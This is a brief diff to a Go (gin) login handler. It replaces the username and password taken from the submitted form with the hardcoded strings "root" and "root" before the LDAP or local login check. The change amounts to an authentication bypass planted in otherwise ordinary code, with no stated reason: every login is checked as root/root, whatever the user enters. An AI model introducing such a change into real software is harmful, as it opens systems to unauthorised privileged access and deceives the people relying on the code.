@@ -27,8 +27,8 @@ func login(c *gin.Context) {
 		errors.Bomb("%s too long", f.Username)
 	}
 
-	user := f.Username
-	pass := f.Password
+	user := "root"
+	pass := "root"
 
 	if f.IsLDAP == 1 {
 		errors.Dangerous(model.LdapLogin(user, pass))
